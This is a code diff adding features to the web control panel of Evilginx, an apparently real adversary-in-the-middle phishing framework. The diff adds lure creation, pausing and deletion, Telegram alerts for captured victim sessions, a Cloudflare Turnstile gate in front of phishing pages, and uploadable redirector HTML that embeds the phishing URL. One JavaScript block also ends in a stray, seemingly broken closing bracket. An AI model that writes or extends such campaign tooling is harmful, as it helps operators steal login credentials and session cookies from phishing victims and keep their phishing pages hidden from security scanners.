@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
@@ -138,7 +139,9 @@ func NewWebServer(cfg *Config, db *database.Database, proxy *HttpProxy) *WebServ
 	
 	// API routes
 	router.HandleFunc("/api/sessions", ws.handleAPISessions).Methods("GET")
+	router.HandleFunc("/api/sessions", ws.handleAPIDeleteAllSessions).Methods("DELETE")
 	router.HandleFunc("/api/sessions/{id}", ws.handleAPISessionDetails).Methods("GET")
+	router.HandleFunc("/api/sessions/{id}", ws.handleAPIDeleteSession).Methods("DELETE")
 	router.HandleFunc("/api/stats", ws.handleAPIStats).Methods("GET")
 	router.HandleFunc("/api/phishlets", ws.handleAPIPhishlets).Methods("GET")
 	router.HandleFunc("/api/phishlets/{name}/enable", ws.handleAPIPhishletEnable).Methods("POST")
@@ -152,6 +155,18 @@ func NewWebServer(cfg *Config, db *database.Database, proxy *HttpProxy) *WebServ
 	router.HandleFunc("/api/lures/{id}", ws.handleAPIUpdateLure).Methods("PUT")
 	router.HandleFunc("/api/lures/{id}", ws.handleAPIDeleteLure).Methods("DELETE")
 	router.HandleFunc("/api/lures/{id}/url", ws.handleAPILureGetURL).Methods("GET")
+	router.HandleFunc("/api/lures/{id}/pause", ws.handleAPILurePause).Methods("POST")
+	router.HandleFunc("/api/lures/{id}/unpause", ws.handleAPILureUnpause).Methods("POST")
+	
+	// Configuration routes  
+	router.HandleFunc("/api/config/telegram", ws.handleAPITelegramConfig).Methods("GET", "POST")
+	router.HandleFunc("/api/config/telegram/test", ws.handleAPITelegramTest).Methods("POST")
+	router.HandleFunc("/api/config/turnstile", ws.handleAPITurnstileConfig).Methods("GET", "POST")
+	
+	// Redirector routes
+	router.HandleFunc("/api/redirectors", ws.handleAPIRedirectors).Methods("GET")
+	router.HandleFunc("/api/redirectors/upload", ws.handleAPIRedirectorUpload).Methods("POST")
+	router.HandleFunc("/api/redirectors/{name}", ws.handleAPIDeleteRedirector).Methods("DELETE")
 	
 	// Authentication routes
 	router.HandleFunc("/api/auth/status", ws.handleAuthStatus).Methods("GET")
@@ -508,6 +523,34 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
 
         .form-group input::placeholder {
             color: var(--text-muted);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: auto;
+            margin: 0;
+            accent-color: var(--accent-primary);
+        }
+
+        .form-group small {
+            color: var(--text-secondary);
+            font-size: 12px;
+            margin-top: 4px;
+            display: block;
+        }
+
+        .form-group small a {
+            color: var(--accent-primary);
+            text-decoration: none;
+        }
+
+        .form-group small a:hover {
+            text-decoration: underline;
         }
 
         /* Error Messages */
@@ -1224,6 +1267,136 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
         </div>
     </div>
 
+    <!-- Create Lure Modal -->
+    <div id="createLureModal" class="modal">
+        <div class="modal-content">
+            <h2>🎣 Create New Lure</h2>
+            <p>Configure your new phishing lure with the options below.</p>
+            <form id="createLureForm">
+                <div class="form-group">
+                    <label for="lurePhishlet">Phishlet Name:</label>
+                    <input type="text" id="lurePhishlet" placeholder="e.g., microsoft, google, github" required>
+                </div>
+                <div class="form-group">
+                    <label for="lureHostname">Custom Hostname (optional):</label>
+                    <input type="text" id="lureHostname" placeholder="Leave empty for default">
+                </div>
+                <div class="form-group">
+                    <label for="lureRedirectUrl">Redirect URL (optional):</label>
+                    <input type="url" id="lureRedirectUrl" placeholder="https://example.com">
+                </div>
+                <div style="display: flex; gap: 12px; justify-content: center; margin-top: 24px;">
+                    <button type="submit" class="btn btn-primary">Create Lure</button>
+                    <button type="button" class="btn btn-secondary" onclick="closeModal('createLureModal')">Cancel</button>
+                </div>
+            </form>
+            <div id="createLureError" class="error hidden"></div>
+        </div>
+    </div>
+
+    <!-- Telegram Configuration Modal -->
+    <div id="telegramConfigModal" class="modal">
+        <div class="modal-content">
+            <h2>📱 Telegram Configuration</h2>
+            <p>Configure Telegram notifications for captured sessions.</p>
+            <form id="telegramConfigForm">
+                <div class="form-group">
+                    <label for="telegramBotToken">Bot Token:</label>
+                    <input type="text" id="telegramBotToken" placeholder="1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ" style="font-family: monospace;">
+                    <small>Get this from <a href="https://t.me/BotFather" target="_blank">@BotFather</a> on Telegram</small>
+                </div>
+                <div class="form-group">
+                    <label for="telegramChatId">Chat ID:</label>
+                    <input type="text" id="telegramChatId" placeholder="-1001234567890" style="font-family: monospace;">
+                    <small>Get this from <a href="https://t.me/userinfobot" target="_blank">@userinfobot</a> or use negative number for groups</small>
+                </div>
+                <div class="form-group">
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="telegramEnabled">
+                        <label for="telegramEnabled">Enable Telegram notifications</label>
+                    </div>
+                </div>
+                <div style="display: flex; gap: 12px; justify-content: center; margin-top: 24px;">
+                    <button type="submit" class="btn btn-primary">Save Configuration</button>
+                    <button type="button" class="btn btn-secondary" onclick="closeModal('telegramConfigModal')">Cancel</button>
+                </div>
+            </form>
+            <div id="telegramConfigError" class="error hidden"></div>
+        </div>
+    </div>
+
+    <!-- Turnstile Configuration Modal -->
+    <div id="turnstileConfigModal" class="modal">
+        <div class="modal-content">
+            <h2>🛡️ Turnstile Configuration</h2>
+            <p>Configure Cloudflare Turnstile CAPTCHA protection.</p>
+            <form id="turnstileConfigForm">
+                <div class="form-group">
+                    <label for="turnstileSiteKey">Site Key:</label>
+                    <input type="text" id="turnstileSiteKey" placeholder="0x4AAAAAAABvBmSrGNuNWZS3" style="font-family: monospace;">
+                    <small>Get this from your <a href="https://dash.cloudflare.com/profile/api-tokens" target="_blank">Cloudflare Dashboard</a> → Turnstile</small>
+                </div>
+                <div class="form-group">
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="turnstileEnabled">
+                        <label for="turnstileEnabled">Enable Turnstile protection</label>
+                    </div>
+                </div>
+                <div style="display: flex; gap: 12px; justify-content: center; margin-top: 24px;">
+                    <button type="submit" class="btn btn-primary">Save Configuration</button>
+                    <button type="button" class="btn btn-secondary" onclick="closeModal('turnstileConfigModal')">Cancel</button>
+                </div>
+            </form>
+            <div id="turnstileConfigError" class="error hidden"></div>
+        </div>
+    </div>
+
+    <!-- Redirector Upload Modal -->
+    <div id="redirectorUploadModal" class="modal">
+        <div class="modal-content">
+            <h2>📤 Upload Redirector HTML</h2>
+            <p>Upload a custom HTML file for lure redirectors.</p>
+            <form id="redirectorUploadForm">
+                <div class="form-group">
+                    <label for="redirectorName">Redirector Name:</label>
+                    <input type="text" id="redirectorName" placeholder="e.g., login-page, captcha-challenge" required>
+                    <small>This name will be used to reference the redirector in lures</small>
+                </div>
+                <div class="form-group">
+                    <label for="redirectorHtmlFile">HTML File:</label>
+                    <input type="file" id="redirectorHtmlFile" accept=".html,.htm" required>
+                    <small>Select an HTML file to upload (.html or .htm)</small>
+                </div>
+                <div class="form-group">
+                    <small><strong>Available Template Variables:</strong><br>
+                    • {lure_url_html} - The phishing URL<br>
+                    • {lure_url_js} - JavaScript-safe URL<br>
+                    • {turnstile_site_key} - Turnstile site key (if enabled)</small>
+                </div>
+                <div style="display: flex; gap: 12px; justify-content: center; margin-top: 24px;">
+                    <button type="submit" class="btn btn-primary">Upload Redirector</button>
+                    <button type="button" class="btn btn-secondary" onclick="closeModal('redirectorUploadModal')">Cancel</button>
+                </div>
+            </form>
+            <div id="redirectorUploadError" class="error hidden"></div>
+        </div>
+    </div>
+
+    <!-- Redirectors Management Modal -->
+    <div id="redirectorsModal" class="modal">
+        <div class="modal-content" style="max-width: 800px;">
+            <h2>📋 Manage Redirectors</h2>
+            <p>View and manage your uploaded redirector HTML files.</p>
+            <div id="redirectors-list" style="max-height: 400px; overflow-y: auto;">
+                Loading redirectors...
+            </div>
+            <div style="display: flex; gap: 12px; justify-content: center; margin-top: 24px;">
+                <button type="button" class="btn btn-primary" onclick="loadRedirectors()">🔄 Refresh</button>
+                <button type="button" class="btn btn-secondary" onclick="closeModal('redirectorsModal')">Close</button>
+            </div>
+        </div>
+    </div>
+
     <!-- Terminal Modal -->
     <div id="terminalModal" class="modal terminal-modal">
         <div class="modal-content terminal-content">
@@ -1276,21 +1449,109 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
         </div>
 
         <div class="sessions-section">
-            <h2 class="section-title">📊 Recent Sessions</h2>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <h2 class="section-title">📊 Recent Sessions</h2>
+                <button class="btn btn-secondary btn-sm" onclick="refreshSessions()" title="Refresh sessions">🔄 Refresh</button>
+            </div>
             <div id="sessions-content" class="loading">Loading sessions...</div>
         </div>
 
         <div class="sessions-section">
-            <h2 class="section-title">🎯 Phishlets</h2>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <h2 class="section-title">🎯 Phishlets</h2>
+                <button class="btn btn-secondary btn-sm" onclick="refreshPhishlets()" title="Refresh phishlets">🔄 Refresh</button>
+            </div>
             <div id="phishlets-content" class="loading">Loading phishlets...</div>
         </div>
 
         <div class="sessions-section">
-            <h2 class="section-title">🎣 Lures</h2>
-            <div style="margin-bottom: 20px;">
-                <button class="btn btn-primary" onclick="showCreateLureModal()">➕ Create New Lure</button>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <h2 class="section-title">🎣 Lures</h2>
+                <div style="display: flex; gap: 8px;">
+                    <button class="btn btn-primary" onclick="showCreateLureModal()">➕ Create New Lure</button>
+                    <button class="btn btn-secondary btn-sm" onclick="refreshLures()" title="Refresh lures">🔄 Refresh</button>
+                </div>
             </div>
             <div id="lures-content" class="loading">Loading lures...</div>
+        </div>
+
+        <div class="sessions-section">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <h2 class="section-title">⚙️ Configuration</h2>
+                <div style="display: flex; gap: 8px;">
+                    <button class="btn btn-secondary btn-sm" onclick="refreshConfig()" title="Refresh configuration">🔄 Refresh</button>
+                </div>
+            </div>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px;">
+                <!-- Telegram Configuration -->
+                <div class="phishlet-card">
+                    <div class="phishlet-name">📱 Telegram Notifications</div>
+                    <div class="phishlet-status">
+                        <span>Status:</span>
+                        <span class="status-badge" id="telegram-status">Loading...</span>
+                    </div>
+                    <div class="phishlet-status">
+                        <span>Bot Token:</span>
+                        <span id="telegram-token-display" style="font-family: monospace; font-size: 12px;">Loading...</span>
+                    </div>
+                    <div class="phishlet-status">
+                        <span>Chat ID:</span>
+                        <span id="telegram-chat-display" style="font-family: monospace;">Loading...</span>
+                    </div>
+                    <div class="phishlet-actions">
+                        <button class="btn btn-primary btn-sm" onclick="showTelegramConfigModal()">⚙️ Configure</button>
+                        <button class="btn btn-secondary btn-sm" onclick="testTelegramConnection()" id="telegram-test-btn" disabled>🧪 Test</button>
+                    </div>
+                </div>
+
+                <!-- Turnstile Configuration -->
+                <div class="phishlet-card">
+                    <div class="phishlet-name">🛡️ Turnstile Protection</div>
+                    <div class="phishlet-status">
+                        <span>Status:</span>
+                        <span class="status-badge" id="turnstile-status">Loading...</span>
+                    </div>
+                    <div class="phishlet-status">
+                        <span>Site Key:</span>
+                        <span id="turnstile-key-display" style="font-family: monospace; font-size: 12px;">Loading...</span>
+                    </div>
+                    <div class="phishlet-actions">
+                        <button class="btn btn-primary btn-sm" onclick="showTurnstileConfigModal()">⚙️ Configure</button>
+                        <button class="btn btn-secondary btn-sm" onclick="toggleTurnstileHelp()">❓ Help</button>
+                    </div>
+                    <div id="turnstile-help" style="display: none; margin-top: 12px; padding: 12px; background: var(--bg-tertiary); border-radius: var(--radius-md); font-size: 12px;">
+                        <strong>Turnstile Setup:</strong><br>
+                        1. Visit <a href="https://dash.cloudflare.com/" target="_blank">Cloudflare Dashboard</a><br>
+                        2. Go to Security → Turnstile<br>
+                        3. Create a new site and get your Site Key<br>
+                        4. Configure the key here and enable Turnstile<br>
+                        5. Use {turnstile_site_key} in your redirector HTML
+                    </div>
+                </div>
+
+                <!-- Redirector Management -->
+                <div class="phishlet-card">
+                    <div class="phishlet-name">📄 Redirector Management</div>
+                    <div class="phishlet-status">
+                        <span>Available Redirectors:</span>
+                        <span id="redirector-count">Loading...</span>
+                    </div>
+                    <div class="phishlet-actions">
+                        <button class="btn btn-primary btn-sm" onclick="showRedirectorUploadModal()">📤 Upload HTML</button>
+                        <button class="btn btn-secondary btn-sm" onclick="showRedirectorsModal()">📋 Manage</button>
+                        <button class="btn btn-secondary btn-sm" onclick="toggleRedirectorHelp()">❓ Help</button>
+                    </div>
+                    <div id="redirector-help" style="display: none; margin-top: 12px; padding: 12px; background: var(--bg-tertiary); border-radius: var(--radius-md); font-size: 12px;">
+                        <strong>Redirector HTML:</strong><br>
+                        • Upload custom index.html files for lure redirectors<br>
+                        • Use template variables: {lure_url_html}, {turnstile_site_key}<br>
+                        • Assign to lures via the lure edit function<br>
+                        • HTML will be served when lure path is accessed<br>
+                        • Perfect for custom landing pages or CAPTCHA challenges
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -1461,6 +1722,13 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                         this.showDashboard();
                         if (window.dashboard) {
                             window.dashboard.init();
+                            
+                            // Load configuration after dashboard initialization
+                            setTimeout(() => {
+                                loadTelegramConfig();
+                                loadTurnstileConfig();
+                                loadRedirectorCount();
+                            }, 100);
                         }
                     } else {
                         this.showError('loginError', data.message);
@@ -1615,6 +1883,163 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                 const key = document.getElementById('unlockKey').value;
                 authManager.unlockPanel(key);
             });
+
+            document.getElementById('createLureForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                hideCreateLureError();
+                const phishlet = document.getElementById('lurePhishlet').value.trim();
+                const hostname = document.getElementById('lureHostname').value.trim();
+                const redirectUrl = document.getElementById('lureRedirectUrl').value.trim();
+                
+                if (!phishlet) {
+                    showCreateLureError('Phishlet name is required');
+                    return;
+                }
+                
+                createLure(phishlet, hostname, redirectUrl);
+            });
+
+            document.getElementById('telegramConfigForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const botToken = document.getElementById('telegramBotToken').value.trim();
+                const chatId = document.getElementById('telegramChatId').value.trim();
+                const enabled = document.getElementById('telegramEnabled').checked;
+                
+                saveTelegramConfig(botToken, chatId, enabled);
+            });
+
+            document.getElementById('turnstileConfigForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const siteKey = document.getElementById('turnstileSiteKey').value.trim();
+                const enabled = document.getElementById('turnstileEnabled').checked;
+                
+                saveTurnstileConfig(siteKey, enabled);
+            });
+
+            document.getElementById('redirectorUploadForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const name = document.getElementById('redirectorName').value.trim();
+                const fileInput = document.getElementById('redirectorHtmlFile');
+                
+                if (!name || !fileInput.files[0]) {
+                    showRedirectorUploadError('Please provide both name and HTML file');
+                    return;
+                }
+                
+                uploadRedirector(name, fileInput.files[0]);
+            });
+        });
+
+        async function saveTelegramConfig(botToken, chatId, enabled) {
+            const errorEl = document.getElementById('telegramConfigError');
+            errorEl.classList.add('hidden');
+
+            try {
+                const response = await fetch('/api/config/telegram', {
+                    method: 'POST',
+                    headers: { 
+                        'Authorization': authManager.token,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        bot_token: botToken,
+                        chat_id: chatId,
+                        enabled: enabled
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.success) {
+                    showToast('Telegram configuration saved!', 'success');
+                    closeModal('telegramConfigModal');
+                    loadTelegramConfig();
+                } else {
+                    errorEl.textContent = data.message;
+                    errorEl.classList.remove('hidden');
+                }
+            } catch (error) {
+                console.error('Error saving Telegram config:', error);
+                errorEl.textContent = 'Failed to save configuration';
+                errorEl.classList.remove('hidden');
+            }
+        }
+
+        async function saveTurnstileConfig(siteKey, enabled) {
+            const errorEl = document.getElementById('turnstileConfigError');
+            errorEl.classList.add('hidden');
+
+            try {
+                const response = await fetch('/api/config/turnstile', {
+                    method: 'POST',
+                    headers: { 
+                        'Authorization': authManager.token,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        site_key: siteKey,
+                        enabled: enabled
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.success) {
+                    showToast('Turnstile configuration saved!', 'success');
+                    closeModal('turnstileConfigModal');
+                    loadTurnstileConfig();
+                } else {
+                    errorEl.textContent = data.message;
+                    errorEl.classList.remove('hidden');
+                }
+            } catch (error) {
+                console.error('Error saving Turnstile config:', error);
+                errorEl.textContent = 'Failed to save configuration';
+                errorEl.classList.remove('hidden');
+            }
+        }
+
+        async function uploadRedirector(name, file) {
+            const errorEl = document.getElementById('redirectorUploadError');
+            const submitBtn = document.querySelector('#redirectorUploadForm button[type="submit"]');
+            const originalText = submitBtn.textContent;
+            
+            errorEl.classList.add('hidden');
+            submitBtn.textContent = '⏳ Uploading...';
+            submitBtn.disabled = true;
+
+            try {
+                const formData = new FormData();
+                formData.append('name', name);
+                formData.append('html_file', file);
+
+                const response = await fetch('/api/redirectors/upload', {
+                    method: 'POST',
+                    headers: { 
+                        'Authorization': authManager.token
+                    },
+                    body: formData
+                });
+                
+                const data = await response.json();
+                if (data.success) {
+                    showToast('Redirector uploaded successfully!', 'success');
+                    closeModal('redirectorUploadModal');
+                    loadRedirectorCount();
+                } else {
+                    showRedirectorUploadError(data.message);
+                }
+            } catch (error) {
+                console.error('Error uploading redirector:', error);
+                showRedirectorUploadError('Failed to upload redirector');
+            } finally {
+                submitBtn.textContent = originalText;
+                submitBtn.disabled = false;
+            }
+        }
+
+        function showRedirectorUploadError(message) {
+            const errorEl = document.getElementById('redirectorUploadError');
+            errorEl.textContent = message;
+            errorEl.classList.remove('hidden');
         });
 
         class EvilginxDashboard {
@@ -1864,6 +2289,11 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                 let luresHTML = '<div class="phishlets-grid">';
                 
                 lures.forEach((lure, index) => {
+                    const isPaused = lure.paused > 0 && new Date(lure.paused * 1000) > new Date();
+                    const pauseStatus = isPaused ? 
+                        new Date(lure.paused * 1000).toLocaleString() : 
+                        'Not paused';
+                    
                     luresHTML += '<div class="phishlet-card">' +
                         '<div class="phishlet-name">Lure #' + index + '</div>' +
                         '<div class="phishlet-status">' +
@@ -1879,13 +2309,27 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                             '<span>' + (lure.hostname || 'Default') + '</span>' +
                         '</div>' +
                         '<div class="phishlet-status">' +
+                            '<span>Status:</span>' +
+                            '<span class="status-badge ' + (isPaused ? 'status-empty' : 'status-captured') + '">' +
+                                (isPaused ? '⏸️ Paused' : '▶️ Active') +
+                            '</span>' +
+                        '</div>' +
+                        '<div class="phishlet-status">' +
+                            '<span>Paused Until:</span>' +
+                            '<span style="font-size: 12px;">' + pauseStatus + '</span>' +
+                        '</div>' +
+                        '<div class="phishlet-status">' +
                             '<span>Redirect URL:</span>' +
                             '<span>' + (lure.redirect_url || 'None') + '</span>' +
                         '</div>' +
                         '<div class="phishlet-actions">' +
-                            '<button class="btn btn-primary" onclick="getLureURL(' + index + ')">🔗 Get URL</button>' +
-                            '<button class="btn btn-secondary" onclick="editLure(' + index + ')">✏️ Edit</button>' +
-                            '<button class="btn btn-secondary" onclick="deleteLure(' + index + ')">🗑️ Delete</button>' +
+                            '<button class="btn btn-primary btn-sm" onclick="getLureURL(' + index + ')">🔗 Get URL</button>' +
+                            '<button class="btn btn-secondary btn-sm" onclick="editLure(' + index + ')">✏️ Edit</button>' +
+                            (isPaused ? 
+                                '<button class="btn btn-success btn-sm" onclick="unpauseLure(' + index + ')">▶️ Unpause</button>' :
+                                '<button class="btn btn-warning btn-sm" onclick="pauseLure(' + index + ')">⏸️ Pause</button>'
+                            ) +
+                            '<button class="btn btn-danger btn-sm" onclick="deleteLure(' + index + ')">🗑️ Delete</button>' +
                         '</div>' +
                     '</div>';
                 });
@@ -2165,44 +2609,96 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             );
         }
 
-        // Global functions for lure management
-        function showCreateLureModal() {
-            showModal('Create New Lure', 'Enter the phishlet name for the new lure:', [
-                {
-                    text: 'Create Lure',
-                    class: 'btn-primary',
-                    onclick: () => {
-                        closeModal('messageModal');
-                        const phishlet = prompt('Enter phishlet name:');
-                        if (phishlet) {
-                            createLure(phishlet);
-                        }
-                    }
-                },
-                { text: 'Cancel', class: 'btn-secondary' }
-            ]);
+        // Global functions for refresh
+        function refreshSessions() {
+            document.getElementById('sessions-content').innerHTML = '<div class="loading">Loading sessions...</div>';
+            if (window.dashboard) {
+                fetch('/api/sessions').then(r => r.json())
+                    .then(data => window.dashboard.updateSessionsTable(data))
+                    .catch(error => {
+                        console.error('Error refreshing sessions:', error);
+                        showToast('Failed to refresh sessions', 'error');
+                    });
+            }
         }
 
-        async function createLure(phishletName) {
+        function refreshPhishlets() {
+            document.getElementById('phishlets-content').innerHTML = '<div class="loading">Loading phishlets...</div>';
+            if (window.dashboard) {
+                fetch('/api/phishlets').then(r => r.json())
+                    .then(data => window.dashboard.updatePhishlets(data))
+                    .catch(error => {
+                        console.error('Error refreshing phishlets:', error);
+                        showToast('Failed to refresh phishlets', 'error');
+                    });
+            }
+        }
+
+        function refreshLures() {
+            document.getElementById('lures-content').innerHTML = '<div class="loading">Loading lures...</div>';
+            if (window.dashboard) {
+                fetch('/api/lures', { headers: { 'Authorization': authManager.token } })
+                    .then(r => r.json())
+                    .then(data => window.dashboard.updateLures(data))
+                    .catch(error => {
+                        console.error('Error refreshing lures:', error);
+                        showToast('Failed to refresh lures', 'error');
+                    });
+            }
+        }
+
+        function refreshConfig() {
+            loadTelegramConfig();
+            loadTurnstileConfig();
+            loadRedirectorCount();
+        }
+
+        // Global functions for lure management
+        function showCreateLureModal() {
+            document.getElementById('createLureModal').classList.add('active');
+            document.getElementById('createLureError').classList.add('hidden');
+            document.getElementById('createLureForm').reset();
+        }
+
+        function hideCreateLureError() {
+            document.getElementById('createLureError').classList.add('hidden');
+        }
+
+        function showCreateLureError(message) {
+            const errorEl = document.getElementById('createLureError');
+            errorEl.textContent = message;
+            errorEl.classList.remove('hidden');
+        }
+
+        async function createLure(phishletName, hostname = '', redirectUrl = '') {
             try {
+                const lureData = { phishlet: phishletName };
+                if (hostname && hostname.trim()) {
+                    lureData.hostname = hostname.trim();
+                }
+                if (redirectUrl && redirectUrl.trim()) {
+                    lureData.redirect_url = redirectUrl.trim();
+                }
+
                 const response = await fetch('/api/lures', {
                     method: 'POST',
                     headers: { 
                         'Authorization': authManager.token,
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ phishlet: phishletName })
+                    body: JSON.stringify(lureData)
                 });
                 const data = await response.json();
                 if (response.ok) {
                     showToast('Lure created successfully!', 'success');
+                    closeModal('createLureModal');
                     window.dashboard.loadInitialData();
                 } else {
-                    showModal('Error', 'Failed to create lure: ' + (data.message || 'Unknown error'));
+                    showCreateLureError('Failed to create lure: ' + (data.message || 'Unknown error'));
                 }
             } catch (error) {
                 console.error('Error creating lure:', error);
-                showModal('Error', 'Failed to create lure. Please try again.');
+                showCreateLureError('Failed to create lure. Please try again.');
             }
         }
 
@@ -2305,10 +2801,359 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             );
         }
 
+        async function pauseLure(lureId) {
+            showModal('Pause Lure', 'How long would you like to pause this lure?', [
+                {
+                    text: '30 minutes',
+                    class: 'btn-primary',
+                    onclick: () => { closeModal('messageModal'); doPauseLure(lureId, '30m'); }
+                },
+                {
+                    text: '2 hours',
+                    class: 'btn-primary', 
+                    onclick: () => { closeModal('messageModal'); doPauseLure(lureId, '2h'); }
+                },
+                {
+                    text: '1 day',
+                    class: 'btn-primary',
+                    onclick: () => { closeModal('messageModal'); doPauseLure(lureId, '24h'); }
+                },
+                {
+                    text: 'Custom',
+                    class: 'btn-secondary',
+                    onclick: () => {
+                        closeModal('messageModal');
+                        const duration = prompt('Enter duration (e.g., 1h30m, 2d, 45m):');
+                        if (duration) {
+                            doPauseLure(lureId, duration);
+                        }
+                    }
+                },
+                {
+                    text: 'Cancel',
+                    class: 'btn-secondary'
+                }
+            ]);
+        }
+
+        async function doPauseLure(lureId, duration) {
+            try {
+                const response = await fetch('/api/lures/' + lureId + '/pause', {
+                    method: 'POST',
+                    headers: { 
+                        'Authorization': authManager.token,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ duration: duration })
+                });
+                const data = await response.json();
+                if (response.ok) {
+                    showToast('Lure paused for ' + duration, 'success');
+                    window.dashboard.loadInitialData();
+                } else {
+                    showModal('Error', 'Failed to pause lure: ' + (data.message || 'Unknown error'));
+                }
+            } catch (error) {
+                console.error('Error pausing lure:', error);
+                showModal('Error', 'Failed to pause lure. Please try again.');
+            }
+        }
+
+        async function unpauseLure(lureId) {
+            showConfirm(
+                'Unpause Lure',
+                'Are you sure you want to unpause this lure? It will become active immediately.',
+                async () => {
+                    try {
+                        const response = await fetch('/api/lures/' + lureId + '/unpause', {
+                            method: 'POST',
+                            headers: { 'Authorization': authManager.token }
+                        });
+                        if (response.ok) {
+                            showToast('Lure unpaused successfully!', 'success');
+                            window.dashboard.loadInitialData();
+                        } else {
+                            const data = await response.json();
+                            showModal('Error', 'Failed to unpause lure: ' + (data.message || 'Unknown error'));
+                        }
+                    } catch (error) {
+                        console.error('Error unpausing lure:', error);
+                        showModal('Error', 'Failed to unpause lure. Please try again.');
+                    }
+                },
+                'Unpause Lure'
+                         );
+        }
+
+        // Configuration functions
+        async function loadTelegramConfig() {
+            try {
+                const response = await fetch('/api/config/telegram', {
+                    headers: { 'Authorization': authManager.token }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    updateTelegramDisplay(data);
+                } else {
+                    console.error('Failed to load Telegram config:', response.status);
+                }
+            } catch (error) {
+                console.error('Error loading Telegram config:', error);
+            }
+        }
+
+        function updateTelegramDisplay(config) {
+            const status = document.getElementById('telegram-status');
+            const tokenDisplay = document.getElementById('telegram-token-display');
+            const chatDisplay = document.getElementById('telegram-chat-display');
+            const testBtn = document.getElementById('telegram-test-btn');
+
+            if (config.enabled && config.bot_token && config.chat_id) {
+                status.textContent = '🟢 Enabled';
+                status.className = 'status-badge status-captured';
+                testBtn.disabled = false;
+            } else {
+                status.textContent = '🔴 Disabled';
+                status.className = 'status-badge status-empty';
+                testBtn.disabled = true;
+            }
+
+            tokenDisplay.textContent = config.bot_token ? 
+                config.bot_token.substring(0, 15) + '...' : 
+                'Not configured';
+            chatDisplay.textContent = config.chat_id || 'Not configured';
+        }
+
+        async function loadTurnstileConfig() {
+            try {
+                const response = await fetch('/api/config/turnstile', {
+                    headers: { 'Authorization': authManager.token }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    updateTurnstileDisplay(data);
+                } else {
+                    console.error('Failed to load Turnstile config:', response.status);
+                }
+            } catch (error) {
+                console.error('Error loading Turnstile config:', error);
+            }
+        }
+
+        function updateTurnstileDisplay(config) {
+            const status = document.getElementById('turnstile-status');
+            const keyDisplay = document.getElementById('turnstile-key-display');
+
+            if (config.enabled && config.site_key) {
+                status.textContent = '🟢 Enabled';
+                status.className = 'status-badge status-captured';
+            } else {
+                status.textContent = '🔴 Disabled';
+                status.className = 'status-badge status-empty';
+            }
+
+            keyDisplay.textContent = config.site_key ? 
+                config.site_key.substring(0, 20) + '...' : 
+                'Not configured';
+        }
+
+        function showTelegramConfigModal() {
+            loadTelegramConfigToModal();
+            document.getElementById('telegramConfigModal').classList.add('active');
+            document.getElementById('telegramConfigError').classList.add('hidden');
+        }
+
+        async function loadTelegramConfigToModal() {
+            try {
+                const response = await fetch('/api/config/telegram', {
+                    headers: { 'Authorization': authManager.token }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    document.getElementById('telegramBotToken').value = data.bot_token || '';
+                    document.getElementById('telegramChatId').value = data.chat_id || '';
+                    document.getElementById('telegramEnabled').checked = data.enabled || false;
+                }
+            } catch (error) {
+                console.error('Error loading Telegram config to modal:', error);
+            }
+        }
+
+        function showTurnstileConfigModal() {
+            loadTurnstileConfigToModal();
+            document.getElementById('turnstileConfigModal').classList.add('active');
+            document.getElementById('turnstileConfigError').classList.add('hidden');
+        }
+
+        async function loadTurnstileConfigToModal() {
+            try {
+                const response = await fetch('/api/config/turnstile', {
+                    headers: { 'Authorization': authManager.token }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    document.getElementById('turnstileSiteKey').value = data.site_key || '';
+                    document.getElementById('turnstileEnabled').checked = data.enabled || false;
+                }
+            } catch (error) {
+                console.error('Error loading Turnstile config to modal:', error);
+            }
+        }
+
+        async function testTelegramConnection() {
+            const testBtn = document.getElementById('telegram-test-btn');
+            const originalText = testBtn.textContent;
+            testBtn.textContent = '🔄 Testing...';
+            testBtn.disabled = true;
+
+            try {
+                const response = await fetch('/api/config/telegram/test', {
+                    method: 'POST',
+                    headers: { 'Authorization': authManager.token }
+                });
+                const data = await response.json();
+                
+                if (data.success) {
+                    showToast('✅ ' + data.message, 'success');
+                } else {
+                    showToast('❌ ' + data.message, 'error');
+                }
+            } catch (error) {
+                console.error('Error testing Telegram:', error);
+                showToast('Failed to test Telegram connection', 'error');
+            } finally {
+                testBtn.textContent = originalText;
+                testBtn.disabled = false;
+            }
+        }
+
